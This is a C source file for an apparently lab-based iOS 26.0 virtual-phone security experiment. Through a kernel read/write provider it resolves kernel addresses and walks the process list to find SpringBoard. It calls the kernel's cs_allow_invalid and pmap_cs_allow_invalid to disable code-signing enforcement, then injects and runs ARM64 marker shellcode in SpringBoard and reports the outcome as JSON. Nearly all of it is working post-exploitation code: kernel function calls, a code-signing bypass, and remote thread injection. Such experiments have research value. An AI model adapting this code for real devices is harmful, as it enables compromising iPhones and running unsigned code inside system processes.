#include "CNDLabKernelProtocol.h"

#include <errno.h>
#include <inttypes.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

/* Exact iOS 26.0 / 23A341 vPhone layout and shipped kernel identity. */
static const uint64_t CNDStaticFilesetBase = UINT64_C(0xfffffe0007004000);
static const uint64_t CNDStaticAllProc = UINT64_C(0xfffffe0009813020);
static const uint64_t CNDStaticCSAllowInvalid = UINT64_C(0xfffffe0007f821fc);
static const uint64_t CNDStaticPMAPCSAllowInvalid =
    UINT64_C(0xfffffe000800006c);
static const uint64_t CNDZoneMin = UINT64_C(0xfffffe1000000000);
static const uint64_t CNDZoneMax = UINT64_C(0xfffffe3fffffffff);
static const uint64_t CNDProcROOffset = UINT64_C(0x18);
static const uint64_t CNDProcPIDOffset = UINT64_C(0x60);
static const uint64_t CNDProcROTaskOffset = UINT64_C(0x8);
static const uint64_t CNDTaskMapOffset = UINT64_C(0x28);
static const uint64_t CNDMapPMAPOffset = UINT64_C(0x40);
static const size_t CNDPageSize = 0x4000;
static const uint64_t CNDExecutionNonce = UINT64_C(0xc0de);

static const uint8_t CNDCSAllowInvalidPrologue[] = {
    0x7f, 0x23, 0x03, 0xd5, 0xe9, 0x23, 0xbb, 0x6d,
    0xf8, 0x5f, 0x01, 0xa9, 0xf6, 0x57, 0x02, 0xa9,
    0xf4, 0x4f, 0x03, 0xa9, 0xfd, 0x7b, 0x04, 0xa9,
    0xfd, 0x03, 0x01, 0x91, 0xf3, 0x03, 0x00, 0xaa,
};

static const uint8_t CNDPMAPCSAllowInvalidPrologue[] = {
    0x7f, 0x23, 0x03, 0xd5, 0xff, 0x43, 0x02, 0xd1,
    0xf4, 0x4f, 0x07, 0xa9, 0xfd, 0x7b, 0x08, 0xa9,
    0xfd, 0x03, 0x02, 0x91, 0xf3, 0x03, 0x00, 0xaa,
    0xff, 0x33, 0x00, 0xf9, 0x00, 0xe4, 0x00, 0x6f,
};

typedef struct {
    uint64_t code;
    uint64_t data;
    uint64_t stack;
    uint64_t observed;
    int allocate_code;
    int allocate_data;
    int allocate_stack;
    int write_code;
    int protect_rx;
    int cache_flush;
    int thread_start;
    int thread_terminate;
    int read_result;
    int cleanup_result;
    int executed;
} CNDRXAttempt;

static int transfer_all(int fd, void *buffer, size_t size, int writing)
{
    uint8_t *cursor = buffer;
    while (size != 0) {
        ssize_t amount = writing
            ? write(fd, cursor, size) : read(fd, cursor, size);
        if (amount == 0) return ECONNRESET;
        if (amount < 0) {
            if (errno == EINTR) continue;
            return errno != 0 ? errno : EIO;
        }
        cursor += (size_t)amount;
        size -= (size_t)amount;
    }
    return 0;
}

static int request(int fd, uint32_t operation, uint64_t address,
                   void *buffer, size_t length, uint64_t *value)
{
    int sends_payload = operation == CNDLabKRWOperationWrite ||
        operation == CNDLabKRWOperationResolvePID ||
        operation == CNDLabKRWOperationTaskWrite ||
        operation == CNDLabKRWOperationTaskThreadStart ||
        operation == CNDLabKRWOperationKernelCall;
    int receives_payload = operation == CNDLabKRWOperationRead ||
        operation == CNDLabKRWOperationTaskRead;
    CNDLabKRWRequest message = {
        .magic = CND_LAB_KRW_MAGIC,
        .version = CND_LAB_KRW_VERSION,
        .operation = operation,
        .length = (uint32_t)length,
        .address = address,
    };
    int result = transfer_all(fd, &message, sizeof(message), 1);
    if (result == 0 && sends_payload && length != 0) {
        result = transfer_all(fd, buffer, length, 1);
    }
    CNDLabKRWResponse response = {0};
    if (result == 0) result = transfer_all(fd, &response, sizeof(response), 0);
    if (result == 0 && (response.magic != CND_LAB_KRW_MAGIC ||
        response.status != 0 ||
        (receives_payload && response.length != length) ||
        (!receives_payload && response.length != 0))) {
        result = response.status != 0 ? response.status : EPROTO;
    }
    if (result == 0 && receives_payload && length != 0) {
        result = transfer_all(fd, buffer, length, 0);
    }
    if (result == 0 && value != NULL) *value = response.value;
    return result;
}

static int kernel_read(int fd, uint64_t address, void *buffer, size_t length)
{
    uint8_t *cursor = buffer;
    while (length != 0) {
        size_t amount = length > CND_LAB_KRW_MAX_TRANSFER
            ? CND_LAB_KRW_MAX_TRANSFER : length;
        int result = request(fd, CNDLabKRWOperationRead, address,
                             cursor, amount, NULL);
        if (result != 0) return result;
        address += amount;
        cursor += amount;
        length -= amount;
    }
    return 0;
}

static int kernel_call(int fd, uint64_t function, uint64_t argument,
                       uint64_t *value)
{
    CNDLabKernelCallRequest call = {
        .version = CND_LAB_KCALL_ABI_VERSION,
        .argument_count = 1,
        .function = function,
        .arguments = { argument },
    };
    return request(fd, CNDLabKRWOperationKernelCall,
                   0, &call, sizeof(call), value);
}

#if defined(__arm64__)
__attribute__((naked))
static uint64_t strip_data_pointer(uint64_t value)
{
    __asm__ volatile(".long 0xdac147e0"); /* xpacd x0 */
    __asm__ volatile("ret");
}
#else
static uint64_t strip_data_pointer(uint64_t value)
{
    value &= UINT64_C(0x0000ffffffffffff);
    return (value & UINT64_C(0x0000800000000000)) != 0
        ? value | UINT64_C(0xffff000000000000) : value;
}
#endif

static int kernel_object(uint64_t value)
{
    return value >= CNDZoneMin && value <= CNDZoneMax && (value & 7) == 0;
}

static int read_pointer(int fd, uint64_t address, uint64_t *raw_out,
                        uint64_t *pointer_out)
{
    uint64_t raw = 0;
    int result = kernel_read(fd, address, &raw, sizeof(raw));
    uint64_t pointer = strip_data_pointer(raw);
    if (raw_out != NULL) *raw_out = raw;
    if (pointer_out != NULL) *pointer_out = pointer;
    if (result != 0) return result;
    return kernel_object(pointer) ? 0 : EILSEQ;
}

static uint64_t find_process(int fd, uint64_t head, uint32_t wanted_pid,
                             uint32_t *visited_out)
{
    uint64_t process = strip_data_pointer(head);
    uint32_t visited = 0;
    for (; visited < 1024 && kernel_object(process); visited++) {
        uint8_t header[0x64] = {0};
        if (kernel_read(fd, process, header, sizeof(header)) != 0) break;
        uint32_t pid = 0;
        memcpy(&pid, header + CNDProcPIDOffset, sizeof(pid));
        if (pid == wanted_pid) {
            if (visited_out != NULL) *visited_out = visited + 1;
            return process;
        }
        uint64_t raw_next = 0;
        memcpy(&raw_next, header, sizeof(raw_next));
        uint64_t next = strip_data_pointer(raw_next);
        if (next == process) break;
        process = next;
    }
    if (visited_out != NULL) *visited_out = visited;
    return 0;
}

static uint32_t move_wide(uint32_t base, unsigned int reg,
                          uint16_t immediate, unsigned int shift)
{
    return base | ((shift / 16U) << 21U) |
        ((uint32_t)immediate << 5U) | reg;
}

static size_t marker_code(uint32_t code[8], uint64_t result_address)
{
    code[0] = UINT32_C(0xd503245f); /* bti c */
    code[1] = move_wide(UINT32_C(0xd2800000), 0,
                        (uint16_t)result_address, 0); /* movz x0 */
    code[2] = move_wide(UINT32_C(0xf2800000), 0,
                        (uint16_t)(result_address >> 16), 16); /* movk x0 */
    code[3] = move_wide(UINT32_C(0xf2800000), 0,
                        (uint16_t)(result_address >> 32), 32); /* movk x0 */
    code[4] = move_wide(UINT32_C(0xf2800000), 0,
                        (uint16_t)(result_address >> 48), 48); /* movk x0 */
    code[5] = move_wide(UINT32_C(0xd2800000), 1,
                        (uint16_t)CNDExecutionNonce, 0); /* movz x1 */
    code[6] = UINT32_C(0xf9000001); /* str x1, [x0] */
    code[7] = UINT32_C(0x14000000); /* b . */
    return 8;
}

static void remember_cleanup_error(CNDRXAttempt *attempt, int result)
{
    if (attempt->cleanup_result == 0 && result != 0) {
        attempt->cleanup_result = result;
    }
}

static void rx_attempt(int fd, CNDRXAttempt *attempt)
{
    memset(attempt, 0, sizeof(*attempt));
    attempt->allocate_code = ENOTSUP;
    attempt->allocate_data = ENOTSUP;
    attempt->allocate_stack = ENOTSUP;
    attempt->write_code = ENOTSUP;
    attempt->protect_rx = ENOTSUP;
    attempt->cache_flush = ENOTSUP;
    attempt->thread_start = ENOTSUP;
    attempt->thread_terminate = ENOTSUP;
    attempt->read_result = ENOTSUP;
    attempt->allocate_code = request(
        fd, CNDLabKRWOperationTaskAllocate, 0, NULL, CNDPageSize,
        &attempt->code);
    if (attempt->allocate_code != 0) return;
    attempt->allocate_data = request(
        fd, CNDLabKRWOperationTaskAllocate, 0, NULL, CNDPageSize,
        &attempt->data);
    if (attempt->allocate_data != 0) goto cleanup;
    attempt->allocate_stack = request(
        fd, CNDLabKRWOperationTaskAllocate, 0, NULL, CNDPageSize,
        &attempt->stack);
    if (attempt->allocate_stack != 0) goto cleanup;

    uint32_t code[8] = {0};
    size_t word_count = marker_code(code, attempt->data);
    attempt->write_code = request(
        fd, CNDLabKRWOperationTaskWrite, attempt->code,
        code, word_count * sizeof(code[0]), NULL);
    if (attempt->write_code != 0) goto cleanup;
    attempt->cache_flush = request(
        fd, CNDLabKRWOperationTaskCacheFlush, attempt->code,
        NULL, CNDPageSize, NULL);
    attempt->protect_rx = request(
        fd, CNDLabKRWOperationTaskProtectRX, attempt->code,
        NULL, CNDPageSize, NULL);
    if (attempt->protect_rx != 0) goto cleanup;

    CNDLabTaskThreadStartRequest start = {
        .entry_point = attempt->code,
        .stack_pointer = attempt->stack + CNDPageSize - 0x10,
    };
    attempt->thread_start = request(
        fd, CNDLabKRWOperationTaskThreadStart, 0,
        &start, sizeof(start), NULL);
    if (attempt->thread_start != 0) goto cleanup;
    for (unsigned int poll = 0; poll < 200; poll++) {
        attempt->read_result = request(
            fd, CNDLabKRWOperationTaskRead, attempt->data,
            &attempt->observed, sizeof(attempt->observed), NULL);
        if (attempt->read_result != 0 ||
            attempt->observed == CNDExecutionNonce) break;
        usleep(10000);
    }
    attempt->executed = attempt->read_result == 0 &&
        attempt->observed == CNDExecutionNonce;
    attempt->thread_terminate = request(
        fd, CNDLabKRWOperationTaskThreadTerminate, 0, NULL, 0, NULL);

cleanup:
    if (attempt->stack != 0) {
        remember_cleanup_error(attempt, request(
            fd, CNDLabKRWOperationTaskDeallocate, attempt->stack,
            NULL, CNDPageSize, NULL));
    }
    if (attempt->data != 0) {
        remember_cleanup_error(attempt, request(
            fd, CNDLabKRWOperationTaskDeallocate, attempt->data,
            NULL, CNDPageSize, NULL));
    }
    if (attempt->code != 0) {
        remember_cleanup_error(attempt, request(
            fd, CNDLabKRWOperationTaskDeallocate, attempt->code,
            NULL, CNDPageSize, NULL));
    }
}

static int connect_provider(const char *path)
{
    if (path == NULL || strlen(path) >=
        sizeof(((struct sockaddr_un *)0)->sun_path)) {
        errno = EINVAL;
        return -1;
    }
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    struct sockaddr_un address = { .sun_family = AF_UNIX };
    strcpy(address.sun_path, path);
    if (connect(fd, (struct sockaddr *)&address, sizeof(address)) != 0) {
        int saved_errno = errno;
        close(fd);
        errno = saved_errno;
        return -1;
    }
    return fd;
}

static int resolve_pid(int fd, uint64_t *pid)
{
    static char name[] = "SpringBoard";
    return request(fd, CNDLabKRWOperationResolvePID, 0,
                   name, sizeof(name), pid);
}

static void print_attempt(const char *name, const CNDRXAttempt *attempt)
{
    printf("\"%s\":{\"code\":\"%#" PRIx64 "\","
           "\"data\":\"%#" PRIx64 "\","
           "\"stack\":\"%#" PRIx64 "\","
           "\"allocateCode\":%d,\"allocateData\":%d,"
           "\"allocateStack\":%d,\"writeCode\":%d,"
           "\"cacheFlush\":%d,\"protectRX\":%d,"
           "\"threadStart\":%d,\"threadTerminate\":%d,"
           "\"readResult\":%d,\"observed\":\"%#" PRIx64 "\","
           "\"executed\":%s,\"cleanupResult\":%d}",
           name, attempt->code, attempt->data, attempt->stack,
           attempt->allocate_code, attempt->allocate_data,
           attempt->allocate_stack, attempt->write_code,
           attempt->cache_flush, attempt->protect_rx,
           attempt->thread_start, attempt->thread_terminate,
           attempt->read_result, attempt->observed,
           attempt->executed ? "true" : "false",
           attempt->cleanup_result);
}

int main(int argc, char **argv)
{
    if (argc != 2) {
        fprintf(stderr, "usage: %s PROVIDER_SOCKET\n", argv[0]);
        return 64;
    }
    int fd = connect_provider(argv[1]);
    if (fd < 0) {
        fprintf(stderr, "provider connect failed: %s\n", strerror(errno));
        return 1;
    }

    uint64_t capabilities = 0;
    uint64_t base = 0;
    int result = request(fd, CNDLabKRWOperationCapabilities,
                         0, NULL, 0, &capabilities);
    if (result == 0) {
        result = request(fd, CNDLabKRWOperationKBase,
                         0, NULL, 0, &base);
    }
    const uint64_t required = CNDLabKRWCapabilityKernelReadWrite |
        CNDLabKRWCapabilityDirectTask |
        CNDLabKRWCapabilityProcessResolve |
        CNDLabKRWCapabilityKernelCall;
    if (result != 0 || base < CNDStaticFilesetBase ||
        (capabilities & required) != required) {
        fprintf(stderr,
                "provider identity failed result=%d base=%#" PRIx64
                " capabilities=%#" PRIx64 "\n",
                result, base, capabilities);
        close(fd);
        return 2;
    }

    uint64_t slide = base - CNDStaticFilesetBase;
    uint64_t cs_allow_invalid = CNDStaticCSAllowInvalid + slide;
    uint8_t prologue[sizeof(CNDCSAllowInvalidPrologue)] = {0};
    result = kernel_read(fd, cs_allow_invalid, prologue, sizeof(prologue));
    if (result != 0 || memcmp(prologue, CNDCSAllowInvalidPrologue,
                              sizeof(prologue)) != 0) {
        fprintf(stderr,
                "cs_allow_invalid identity failed result=%d address=%#"
                PRIx64 "\n", result, cs_allow_invalid);
        close(fd);
        return 3;
    }

    uint64_t pid = 0;
    result = resolve_pid(fd, &pid);
    if (result != 0 || pid <= 1 || pid > INT32_MAX) {
        fprintf(stderr, "SpringBoard resolve failed result=%d pid=%#"
                PRIx64 "\n", result, pid);
        close(fd);
        return 4;
    }
    uint64_t allproc_head = 0;
    result = kernel_read(fd, CNDStaticAllProc + slide,
                         &allproc_head, sizeof(allproc_head));
    uint32_t visited = 0;
    uint64_t process = result == 0
        ? find_process(fd, allproc_head, (uint32_t)pid, &visited) : 0;
    if (result != 0 || !kernel_object(process)) {
        fprintf(stderr,
                "SpringBoard proc walk failed result=%d pid=%#" PRIx64
                " visited=%u process=%#" PRIx64 "\n",
                result, pid, visited, process);
        close(fd);
        return 5;
    }
    uint64_t rebound_pid = 0;
    result = resolve_pid(fd, &rebound_pid);
    if (result != 0 || rebound_pid != pid) {
        fprintf(stderr, "SpringBoard identity changed before call\n");
        close(fd);
        return 6;
    }
    result = request(fd, CNDLabKRWOperationTaskOpen,
                     pid, NULL, 0, NULL);
    if (result != 0) {
        fprintf(stderr, "SpringBoard task open failed result=%d\n", result);
        close(fd);
        return 7;
    }

    CNDRXAttempt baseline = {0};
    CNDRXAttempt after = {0};
    CNDRXAttempt after_pmap = {0};
    rx_attempt(fd, &baseline);

    uint64_t call_result = 0;
    uint64_t baseline_post_pid = 0;
    int baseline_post_identity = resolve_pid(fd, &baseline_post_pid);
    int call_status = ESRCH;
    if (baseline_post_identity == 0 && baseline_post_pid == pid) {
        call_status = kernel_call(
            fd, cs_allow_invalid, process, &call_result);
    }

    uint64_t post_pid = 0;
    int post_identity = call_status == 0
        ? resolve_pid(fd, &post_pid) : ESRCH;
    if (post_identity == 0 && post_pid == pid) rx_attempt(fd, &after);

    uint64_t raw_proc_ro = 0;
    uint64_t proc_ro = 0;
    uint64_t raw_task = 0;
    uint64_t task = 0;
    uint64_t raw_map = 0;
    uint64_t map = 0;
    uint64_t raw_pmap = 0;
    uint64_t pmap = 0;
    int pmap_pointer_status = post_identity == 0 && post_pid == pid
        ? read_pointer(fd, process + CNDProcROOffset,
                       &raw_proc_ro, &proc_ro)
        : ESRCH;
    if (pmap_pointer_status == 0) {
        pmap_pointer_status = read_pointer(
            fd, proc_ro + CNDProcROTaskOffset, &raw_task, &task);
    }
    if (pmap_pointer_status == 0) {
        pmap_pointer_status = read_pointer(
            fd, task + CNDTaskMapOffset, &raw_map, &map);
    }
    if (pmap_pointer_status == 0) {
        pmap_pointer_status = read_pointer(
            fd, map + CNDMapPMAPOffset, &raw_pmap, &pmap);
    }
    uint64_t pmap_cs_allow_invalid = CNDStaticPMAPCSAllowInvalid + slide;
    uint8_t pmap_prologue[sizeof(CNDPMAPCSAllowInvalidPrologue)] = {0};
    int pmap_identity_status = kernel_read(
        fd, pmap_cs_allow_invalid, pmap_prologue, sizeof(pmap_prologue));
    if (pmap_identity_status == 0 &&
        memcmp(pmap_prologue, CNDPMAPCSAllowInvalidPrologue,
               sizeof(pmap_prologue)) != 0) {
        pmap_identity_status = EILSEQ;
    }
    int pmap_call_status = ENOTSUP;
    uint64_t pmap_call_result = 0;
    if (!baseline.executed && !after.executed &&
        post_identity == 0 && post_pid == pid &&
        pmap_pointer_status == 0 && pmap_identity_status == 0) {
        pmap_call_status = kernel_call(
            fd, pmap_cs_allow_invalid, pmap, &pmap_call_result);
        uint64_t lower_post_pid = 0;
        int lower_post_identity = resolve_pid(fd, &lower_post_pid);
        if (pmap_call_status == 0 && lower_post_identity == 0 &&
            lower_post_pid == pid) {
            rx_attempt(fd, &after_pmap);
        }
    }

    int close_result = request(fd, CNDLabKRWOperationTaskClose,
                               0, NULL, 0, NULL);
    uint64_t replacement_pid = 0;
    int reset_verified = 0;
    int reset_signal = 0;
    int before_reset_status = resolve_pid(fd, &replacement_pid);
    if (before_reset_status == 0 && replacement_pid > 1 &&
        replacement_pid != pid) {
        reset_verified = 1;
    } else {
        replacement_pid = 0;
        reset_signal = kill((pid_t)pid, SIGKILL) == 0 ? 0 : errno;
    }
    if (!reset_verified && reset_signal == 0) {
        for (unsigned int poll = 0; poll < 200; poll++) {
            int resolve_result = resolve_pid(fd, &replacement_pid);
            if (resolve_result == 0 && replacement_pid > 1 &&
                replacement_pid != pid) {
                reset_verified = 1;
                break;
            }
            usleep(25000);
        }
    }
    close(fd);

    int transition_proven = !baseline.executed && call_status == 0 &&
        call_result != 0 && after.executed;
    int pmap_transition_proven = !baseline.executed && !after.executed &&
        pmap_call_status == 0 && pmap_call_result == 0 &&
        after_pmap.executed;
    const char *classification = transition_proven
        ? "cs-allow-invalid-enabled-rx-execution"
        : pmap_transition_proven
            ? "pmap-cs-allow-invalid-enabled-rx-execution"
        : baseline_post_identity != 0 || baseline_post_pid != pid
            ? "springboard-changed-during-baseline-rx-test"
            : post_identity != 0 || post_pid != pid
                ? "springboard-changed-after-cs-allow-invalid"
        : baseline.executed
            ? "inconclusive-baseline-already-executable"
            : call_status != 0
                ? "kernel-call-transport-failed"
                : pmap_call_status == 0 && pmap_call_result != 0
                    ? "pmap-sptm-transition-denied"
                    : call_result == 0
                        ? "cs-allow-invalid-mac-denied-and-pmap-insufficient"
                        : after.protect_rx != 0 ||
                            after_pmap.protect_rx != 0
                            ? "post-pmap-rx-transition-denied"
                            : "post-pmap-rx-execution-not-observed";
    int infrastructure_healthy = call_status == 0 && close_result == 0 &&
        baseline.cleanup_result == 0 && after.cleanup_result == 0 &&
        after_pmap.cleanup_result == 0 && reset_signal == 0 &&
        reset_verified;

    printf("{\"schema\":\"com.zeroxjf.cyanide.vm-cs-allow-invalid\","
           "\"schemaVersion\":1,\"kernelUUID\":"
           "\"03A93373-6498-3F25-8975-04DED251AF1F\","
           "\"reaEvidence\":"
           "\"ev_c2b765cbfdf0ac852cfc4ec2100d56b68ac3fd5a20e67d5d8efd2f7a7d9496e2\","
           "\"pmapREAEvidence\":"
           "\"ev_de49f3f966d4609eab464b1d729deaca0caa3393c1efe189ec19b010c2545afd\","
           "\"kernelBase\":\"%#" PRIx64 "\","
           "\"kernelSlide\":\"%#" PRIx64 "\","
           "\"capabilities\":\"%#" PRIx64 "\","
           "\"csAllowInvalid\":\"%#" PRIx64 "\","
           "\"springBoardPID\":%" PRIu64 ","
           "\"springBoardProc\":\"%#" PRIx64 "\","
           "\"procWalkCount\":%u,",
           base, slide, capabilities, cs_allow_invalid,
           pid, process, visited);
    print_attempt("baseline", &baseline);
    printf(",\"kernelCallStatus\":%d,"
           "\"csAllowInvalidResult\":\"%#" PRIx64 "\","
           "\"baselinePostIdentityStatus\":%d,"
           "\"baselinePostPID\":%" PRIu64 ","
           "\"postCallIdentityStatus\":%d,"
           "\"postCallPID\":%" PRIu64 ",",
           call_status, call_result, baseline_post_identity,
           baseline_post_pid, post_identity, post_pid);
    print_attempt("after", &after);
    printf(",\"rawProcRO\":\"%#" PRIx64 "\","
           "\"procRO\":\"%#" PRIx64 "\","
           "\"rawTask\":\"%#" PRIx64 "\","
           "\"task\":\"%#" PRIx64 "\","
           "\"rawMap\":\"%#" PRIx64 "\","
           "\"map\":\"%#" PRIx64 "\","
           "\"rawPmap\":\"%#" PRIx64 "\","
           "\"pmap\":\"%#" PRIx64 "\","
           "\"pmapPointerStatus\":%d,"
           "\"pmapCSAllowInvalid\":\"%#" PRIx64 "\","
           "\"pmapIdentityStatus\":%d,"
           "\"pmapKernelCallStatus\":%d,"
           "\"pmapCSAllowInvalidResult\":\"%#" PRIx64 "\",",
           raw_proc_ro, proc_ro, raw_task, task, raw_map, map,
           raw_pmap, pmap, pmap_pointer_status, pmap_cs_allow_invalid,
           pmap_identity_status, pmap_call_status, pmap_call_result);
    print_attempt("afterPmap", &after_pmap);
    printf(",\"transitionProven\":%s,"
           "\"pmapTransitionProven\":%s,\"classification\":\"%s\","
           "\"taskCloseResult\":%d,\"resetSignalResult\":%d,"
           "\"replacementPID\":%" PRIu64 ","
           "\"springBoardResetVerified\":%s,"
           "\"experimentInfrastructureHealthy\":%s,"
           "\"usedKernelRead\":true,\"usedKernelWrite\":false,"
           "\"usedVMProviderKernelCall\":true}\n",
           transition_proven ? "true" : "false",
           pmap_transition_proven ? "true" : "false", classification,
           close_result, reset_signal, replacement_pid,
           reset_verified ? "true" : "false",
           infrastructure_healthy ? "true" : "false");
    return 0;
}
